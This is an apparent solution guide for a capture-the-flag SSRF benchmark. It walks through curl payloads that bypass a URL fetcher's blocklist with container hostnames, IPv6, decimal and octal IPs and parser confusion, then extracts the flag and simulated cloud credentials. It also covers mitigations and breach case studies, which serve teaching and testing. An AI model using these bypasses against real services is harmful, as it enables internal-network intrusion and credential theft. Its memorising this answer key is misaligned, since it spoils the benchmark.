# S7BEN-HARD-003: Comprehensive Testing Guide

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Environment Setup](#environment-setup)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: Filter Analysis](#phase-2-filter-analysis)
5. [Phase 3: Bypass Techniques](#phase-3-bypass-techniques)
6. [Phase 4: Flag Extraction](#phase-4-flag-extraction)
7. [Phase 5: Advanced Exploitation](#phase-5-advanced-exploitation)
8. [Understanding SSRF](#understanding-ssrf)
9. [Real-World Examples](#real-world-examples)
10. [Cleanup](#cleanup)
11. [Troubleshooting](#troubleshooting)

## Prerequisites

### Required Tools

- Docker & Docker Compose
- curl
- Python 3.x with requests library
- jq (optional, for JSON parsing)

### Optional Tools

- Burp Suite (for traffic analysis)
- netcat (for network testing)
- dig/nslookup (for DNS queries)

## Environment Setup

```bash
cd benchmarks/S7BEN-HARD-003
make up
```

Wait for health checks to confirm all services are ready:

```bash
make test
```

Expected output:
```
[✓] Web app is healthy
[✓] Telemetry endpoint working
[✓] All services healthy
```

## Phase 1: Reconnaissance

### Step 1.1: Test Basic Functionality

First, verify the URL fetcher works with public URLs:

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://httpbin.org/get"}'
```

**Expected Output:**
```json
{
  "success": true,
  "status_code": 200,
  "content": "...",
  "headers": {...},
  "url": "https://httpbin.org/get"
}
```

### Step 1.2: Discover Filter Configuration

The application exposes a debug endpoint:

```bash
curl http://localhost:5000/debug/filters | jq
```

**Expected Output:**
```json
{
  "blocked_ips": ["127.0.0.1", "localhost", "0.0.0.0"],
  "blocked_ranges": ["10.", "172.16.", "192.168.", "169.254."],
  "allowed_schemes": ["http", "https"],
  "filter_type": "DNS resolution check",
  "vulnerabilities": [
    "DNS rebinding possible",
    "IPv6 not properly filtered",
    "Decimal IP notation not checked",
    "URL parser confusion possible",
    "Redirect chain not validated"
  ]
}
```

**Key Observations:**
- Filters check DNS resolution of hostname
- Only IPv4 addresses are blocked
- No check for IPv6, decimal notation, or container hostnames
- Redirect chains are followed

### Step 1.3: Map Internal Services

Based on docker-compose.yml, we know:
- `internal-api` runs on port 8080 (backend network)
- `metadata-service` runs on port 8000 (backend network)

## Phase 2: Filter Analysis

### Step 2.1: Test Blocked Addresses

Try accessing localhost directly:

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8080/flag"}'
```

**Expected Output:**
```json
{
  "error": "URL blocked by security filter",
  "reason": "Blocked IP address",
  "debug": {
    "url": "http://127.0.0.1:8080/flag",
    "blocked": true
  }
}
```

### Step 2.2: Test Private IP Ranges

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://10.0.0.1/"}'
```

**Expected Output:**
```json
{
  "error": "URL blocked by security filter",
  "reason": "Private IP address not allowed"
}
```

### Step 2.3: Test Invalid Schemes

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd"}'
```

**Expected Output:**
```json
{
  "error": "URL blocked by security filter",
  "reason": "Invalid URL scheme"
}
```

**Conclusion:** Filters are working as documented, but have bypass opportunities.

## Phase 3: Bypass Techniques

### Technique 1: Docker Container Hostname (PRIMARY METHOD)

Docker containers can resolve each other by container name within the same network:

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/flag"}'
```

**Why this works:**
- `internal-api` is a valid hostname in the Docker network
- DNS resolution succeeds (resolves to container IP like 172.18.0.3)
- Container IPs (172.18.x.x) don't match the blocked range (172.16.x.x)
- Filters only check for `172.16.*` not all `172.*`

**Expected Output:**
```json
{
  "success": true,
  "status_code": 200,
  "content": "{\"flag\":\"S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}\", ...}",
  "url": "http://internal-api:8080/flag"
}
```

🚩 **FLAG CAPTURED!**

### Technique 2: IPv6 Localhost Bypass

The filters only check IPv4 addresses, not IPv6:

```bash
# Note: This may not work in this setup since internal-api
# doesn't listen on IPv6, but demonstrates the concept
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://[::1]:8080/flag"}'
```

**Why this works (in theory):**
- `::1` is IPv6 localhost
- Filters only check IPv4 blocked list
- Would bypass if service listened on IPv6

### Technique 3: Decimal IP Notation

Convert IP addresses to decimal format:

```python
# 127.0.0.1 = (127 * 256^3) + (0 * 256^2) + (0 * 256) + 1
# = 2130706433
```

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8080/flag"}'
```

**Why this might work:**
- Some URL parsers accept decimal IP notation
- Filter checks don't handle this format
- Python's `socket.gethostbyname()` may not resolve it

### Technique 4: Octal IP Notation

```bash
# 127.0.0.1 = 0177.0.0.1 (octal)
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0177.0.0.1:8080/flag"}'
```

### Technique 5: URL Parser Confusion

```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://attacker.com@internal-api:8080/flag"}'
```

**Why this might work:**
- Different URL parsers handle `@` differently
- Some treat `attacker.com` as username, `internal-api` as host
- Filter might check `attacker.com` but request goes to `internal-api`

## Phase 4: Flag Extraction

### Extract Flag from Internal API

Using the container hostname bypass:

```bash
# Request the flag
RESPONSE=$(curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/flag"}')

# Parse and extract flag
echo $RESPONSE | jq -r '.content' | jq -r '.flag'
```

**Output:**
```
S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}
```

### Enumerate Internal API

Discover other endpoints:

```bash
# Root endpoint
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/"}'

# Admin endpoint
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/admin"}'

# Config endpoint
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/config"}'
```

## Phase 5: Advanced Exploitation

### Exploit Metadata Service

Cloud metadata services (like AWS EC2 metadata) often contain sensitive credentials:

```bash
# Instance metadata
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata-service:8000/metadata"}' | jq

# Credentials (simulated AWS IAM credentials)
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata-service:8000/credentials"}' | jq

# User data script
curl -s -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata-service:8000/user-data"}'
```

**Extracted Credentials:**
```json
{
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "admin-api-key-12345",
  "Token": "FQoGZXIvYXdzEBQaD...",
  "Expiration": "2024-12-31T23:59:59Z"
}
```

In a real attack, these credentials would grant AWS API access.

### DNS Rebinding Attack (Conceptual)

DNS rebinding bypasses time-of-check-time-of-use (TOCTOU) vulnerabilities:

1. **Setup:** Control a domain that returns different IPs on subsequent DNS queries
   - First query: Returns public IP (passes filter)
   - Second query: Returns 127.0.0.1 (after filter check)

2. **Attack flow:**
   ```
   Attacker → URL: http://rebind.attacker.com
   App checks DNS → Returns 1.2.3.4 (public) → Passes filter
   App fetches URL → DNS now returns 127.0.0.1 → Accesses localhost
   ```

3. **Why it works:**
   - Filter checks DNS resolution once
   - Doesn't re-check before making request
   - DNS TTL can be set to 0 for immediate re-resolution

**Example setup (requires external server):**
```bash
# Would need a DNS rebinding service like:
# - rebind.it
# - rebinder.com
# - Custom DNS server with time-based responses
curl -X POST http://localhost:5000/fetch \
  -d '{"url":"http://127.0.0.1.xip.io:8080/flag"}'
```

## Understanding SSRF

### What is Server-Side Request Forgery?

SSRF occurs when an attacker can make the server send HTTP requests to arbitrary destinations. This is dangerous because:

1. **Internal Network Access:** Bypass firewalls to reach internal services
2. **Metadata Service Exploitation:** Access cloud provider metadata (AWS, GCP, Azure)
3. **Port Scanning:** Map internal network topology
4. **Credential Theft:** Extract API keys, tokens, passwords from internal services
5. **Service Abuse:** Use the server's IP for attacks (DDoS, spam)

### Why Filters Fail

**Blocklist Approach:**
- Impossible to list all dangerous values
- Encoding bypasses (decimal, octal, hex, IPv6)
- Parser confusion attacks
- DNS rebinding

**Proper Mitigation:**
- **Allowlist only:** Only allow specific safe domains
- **Network segmentation:** Isolate services in separate networks
- **No DNS resolution:** Use static IPs with allowlist
- **Disable redirects:** Don't follow HTTP redirects
- **Validate after DNS:** Re-check resolved IP before request
- **Use egress filtering:** Firewall outbound connections
- **Remove unnecessary features:** Don't implement URL fetch if not needed

### Code Vulnerability Analysis

**Vulnerable code (from app.py):**
```python
def is_safe_url(url):
    # DNS resolution happens here
    ip = socket.gethostbyname(hostname)

    # Check blocked IPs
    if ip in BLOCKED_IPS:
        return False

    # Later, request is made:
    # Problem: DNS could resolve differently!
    resp = requests.get(target_url)
```

**Issues:**
1. DNS resolution can change between check and use
2. Docker container names aren't considered
3. IPv6 not handled
4. Only checks start of IP (10., not all 10.x.x.x)
5. Redirects are followed without re-checking

## Real-World Examples

### Capital One Breach (2019)

**Attack:**
- Exploited SSRF in AWS WAF configuration
- Accessed EC2 instance metadata service
- Retrieved IAM credentials
- Used credentials to access S3 buckets
- Exfiltrated 100+ million customer records

**Timeline:**
```
1. SSRF in application → metadata access
2. IMDSv1 returned IAM credentials
3. Credentials used to list S3 buckets
4. Mass data exfiltration
5. Discovery after months
```

**Impact:**
- $80 million fine
- $100+ million remediation
- Massive reputational damage

**Lessons:**
- Always use IMDSv2 (requires headers, prevents SSRF)
- Network segmentation
- Principle of least privilege for IAM roles

### Shopify SSRF (2019)

**Attack:**
- SSRF in image fetching feature
- Bypassed filters using IPv6
- Accessed internal Kubernetes services
- Retrieved service credentials
- $25,000 bug bounty

### Google Cloud SSRF (2020)

**Attack:**
- SSRF in GCP service
- Metadata service access
- Retrieved service account tokens
- $10,000 bug bounty

## Telemetry Analysis

Check your exploitation metrics:

```bash
curl http://localhost:5000/api/telemetry | jq
```

**Sample output:**
```json
{
  "benchmark_id": "S7BEN-HARD-003",
  "request_count": 25,
  "ssrf_attempts": 18,
  "filter_blocks": 7,
  "internal_access_count": 4,
  "accessed_urls": [
    "http://internal-api:8080/flag",
    "http://internal-api:8080/admin",
    "http://metadata-service:8000/credentials"
  ],
  "uptime_seconds": 450
}
```

**Scoring interpretation:**
- Low filter blocks = stealthy exploitation
- High efficiency = fewer attempts needed
- Internal access = successful bypass

## Cleanup

Reset the benchmark state:

```bash
make reset
```

Stop all services:

```bash
make down
```

Complete cleanup:

```bash
make clean
```

## Troubleshooting

### Services Not Starting

```bash
docker compose logs -f
```

Check specific service:

```bash
make logs-internal
```

### DNS Resolution Issues

Verify Docker network:

```bash
docker network ls
docker network inspect sben-hard-03_backend-net
```

### Filter Not Blocking

Verify filter configuration:

```bash
curl http://localhost:5000/debug/filters
```

### Can't Reach Internal Services

Ensure containers are on same network:

```bash
docker compose ps
```

All services should show "healthy" status.

### Flag Not Appearing

Verify internal-api is running:

```bash
docker compose logs internal-api
```

Test directly (if you exec into container):

```bash
docker exec -it ssrf-web-app curl http://internal-api:8080/flag
```

## Advanced Challenges

### Challenge 1: Automate Enumeration

Write a script to automatically discover all internal endpoints.

### Challenge 2: Port Scanning

Use SSRF to scan ports on internal services.

### Challenge 3: Redirect Chain

Create a redirect chain that bypasses filters.

### Challenge 4: Exfiltrate Data

Extract all sensitive data from metadata service.

## Summary

You've learned:
- ✅ How SSRF vulnerabilities work
- ✅ Common filter bypass techniques
- ✅ Docker container hostname exploitation
- ✅ Cloud metadata service risks
- ✅ Real-world SSRF attack examples
- ✅ Proper SSRF mitigations

**Key Takeaway:** Blocklist-based filtering is insufficient. Always use allowlists and network segmentation for SSRF protection.
